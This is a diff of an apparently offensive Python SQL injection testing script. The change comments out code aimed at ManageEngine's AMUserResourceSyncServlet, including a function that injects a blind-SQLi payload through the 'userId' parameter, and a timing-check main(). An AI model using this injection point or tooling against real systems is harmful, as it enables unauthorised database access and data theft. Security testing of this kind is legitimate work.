@@ -4,7 +4,7 @@
 Author: Aleksa Zatezalo
 Date: December 2024
 Version: 1.0
-Description: Testing for SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet.
+Description: Testing for SQL Injections, across multiple servers vulnerable to SQLi. 
 """
 
 import sys
@@ -244,23 +244,23 @@ def extract_usernames(url, base_injection, max_time, proxy=None):
 
     return usernames
 
-# Manged Engine Specific Exploits
+# # Manged Engine Specific Exploits
 
-def constructBlindSQLi(full_url, sqli):
-    """
-    Constructs the full URL with parameters for a SQL injection payload.
+# def constructBlindSQLi(full_url, sqli):
+#     """
+#     Constructs the full URL with parameters for a SQL injection payload.
 
-    Args:
-        url (str): The target URL.
-        sqli (str): The SQL injection payload.
+#     Args:
+#         url (str): The target URL.
+#         sqli (str): The SQL injection payload.
 
-    Returns:
-        str: The full URL with the SQL injection payload.
-    """
+#     Returns:
+#         str: The full URL with the SQL injection payload.
+#     """
     
-    # Construct the full URL with the SQL injection payload
-    params = f'ForMasRange=1&userId=1{sqli}'
-    return f"{full_url}?{params}"
+#     # Construct the full URL with the SQL injection payload
+#     params = f'ForMasRange=1&userId=1{sqli}'
+#     return f"{full_url}?{params}"
 
 	
 # def blindSQLi(url):
@@ -286,14 +286,14 @@ def constructBlindSQLi(full_url, sqli):
 # 	print(r.headers)
 
 
-def main():
-	if len(sys.argv) != 2:
-		print(f"(+) usage %s <target>" % sys.argv[0])
-		print(f"(+) eg: %s target" % sys.argv[0])
-		sys.exit(1)
+# def main():
+# 	if len(sys.argv) != 2:
+# 		print(f"(+) usage %s <target>" % sys.argv[0])
+# 		print(f"(+) eg: %s target" % sys.argv[0])
+# 		sys.exit(1)
 	
-	if(checkRequesTime(url, 10)):
-            print("Good")
+# 	if(checkRequesTime(url, 10)):
+#             print("Good")
 	
-if __name__ == '__main__':
-	main()
+# if __name__ == '__main__':
+# 	main()
